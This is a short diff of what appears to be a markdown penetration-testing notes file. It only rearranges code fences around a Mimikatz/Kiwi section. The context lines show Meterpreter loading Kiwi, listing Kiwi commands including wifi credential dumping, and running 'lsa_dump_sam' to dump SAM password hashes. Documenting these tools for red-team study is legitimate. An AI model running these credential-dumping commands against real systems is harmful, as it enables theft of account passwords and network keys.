@@ -634,8 +634,6 @@ Dark:"Please don't use this password ever"
 
 - Mimikatz / Kiwi
 
-```
-
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x86/windows)
@@ -674,6 +672,9 @@ Kiwi Commands
     wifi_list              List wifi profiles/creds for the current user
     wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
     
+```
+
+```
 meterpreter > lsa_dump_sam 
 [+] Running as SYSTEM
 [*] Dumping SAM
